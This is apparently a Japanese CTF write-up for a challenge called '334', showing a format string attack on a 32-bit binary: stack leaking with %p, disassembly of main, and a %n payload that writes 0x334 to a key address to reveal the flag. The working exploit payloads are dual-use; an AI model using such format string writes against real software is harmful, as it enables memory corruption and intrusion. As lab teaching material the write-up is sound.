# 334
format string attackを用いる。

```bash=
$ python -c 'import sys;sys.stdout.buffer.write(b"AAAA" + b",%p"*32)' | ./334
AAAA,0x80,0xf7f6c5c0,0x80484bf,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,(nil),0xffcfda8c,0x804859b,0x1key address: 0x804a060
key        : 0x12345678
```

引数はstackの4番目に積まれることがわかります。

したがって, 4番目の変数をいじってみます。

問題文が334なので, `334`を埋め込んでみます。

```bash=
$ echo -e '\x60\xa0\x04\x08%330x%4$n' | ./334
`�                                                                                                                                                                                                                                                                                                                                        80
key address: 0x804a060
key        : 0x14e
```

10進数では334の0x14eが正しく埋め込まれています。
しかし, 表示されないので実行ファイルを逆アセンブルします。

```bash=
$ objdump -d -M intel ./334

./334:     file format elf32-i386

~~~ 略 ~~~

080484a8 <main>:
 80484a8:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 80484ac:	83 e4 f0             	and    esp,0xfffffff0
 80484af:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 80484b2:	55                   	push   ebp
 80484b3:	89 e5                	mov    ebp,esp
 80484b5:	53                   	push   ebx
 80484b6:	51                   	push   ecx
 80484b7:	83 c4 80             	add    esp,0xffffff80
 80484ba:	e8 f1 fe ff ff       	call   80483b0 <__x86.get_pc_thunk.bx>
 80484bf:	81 c3 41 1b 00 00    	add    ebx,0x1b41
 80484c5:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80484cb:	8b 00                	mov    eax,DWORD PTR [eax]
 80484cd:	83 ec 04             	sub    esp,0x4
 80484d0:	50                   	push   eax
 80484d1:	68 80 00 00 00       	push   0x80
 80484d6:	8d 85 78 ff ff ff    	lea    eax,[ebp-0x88]
 80484dc:	50                   	push   eax
 80484dd:	e8 4e fe ff ff       	call   8048330 <fgets@plt>
 80484e2:	83 c4 10             	add    esp,0x10
 80484e5:	83 ec 0c             	sub    esp,0xc
 80484e8:	8d 85 78 ff ff ff    	lea    eax,[ebp-0x88]
 80484ee:	50                   	push   eax
 80484ef:	e8 2c fe ff ff       	call   8048320 <printf@plt>
 80484f4:	83 c4 10             	add    esp,0x10
 80484f7:	83 ec 08             	sub    esp,0x8
 80484fa:	8d 83 60 00 00 00    	lea    eax,[ebx+0x60]
 8048500:	50                   	push   eax
 8048501:	8d 83 dc e5 ff ff    	lea    eax,[ebx-0x1a24]
 8048507:	50                   	push   eax
 8048508:	e8 13 fe ff ff       	call   8048320 <printf@plt>
 804850d:	83 c4 10             	add    esp,0x10
 8048510:	8b 83 60 00 00 00    	mov    eax,DWORD PTR [ebx+0x60]
 8048516:	83 ec 08             	sub    esp,0x8
 8048519:	50                   	push   eax
 804851a:	8d 83 ef e5 ff ff    	lea    eax,[ebx-0x1a11]
 8048520:	50                   	push   eax
 8048521:	e8 fa fd ff ff       	call   8048320 <printf@plt>
 8048526:	83 c4 10             	add    esp,0x10
 8048529:	8b 83 60 00 00 00    	mov    eax,DWORD PTR [ebx+0x60]
 804852f:	3d 34 03 00 00       	cmp    eax,0x334
 8048534:	75 05                	jne    804853b <main+0x93>
 8048536:	e8 3b ff ff ff       	call   8048476 <get_flag>
 804853b:	b8 00 00 00 00       	mov    eax,0x0
 8048540:	8d 65 f8             	lea    esp,[ebp-0x8]
 8048543:	59                   	pop    ecx
 8048544:	5b                   	pop    ebx
 8048545:	5d                   	pop    ebp
 8048546:	8d 61 fc             	lea    esp,[ecx-0x4]
 8048549:	c3                   	ret  
 
~~~ 略 ~~~

```

`0x804852f`番地で`0x334`とcmpされているので, 0x334=820を代入すれば良いことがわかります。

```bash=
$ echo -e '\x60\xa0\x04\x08%816x%4$n' | ./334
`�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              80
key address: 0x804a060
key        : 0x334
flag is taskctf{wh@'2_334?}
```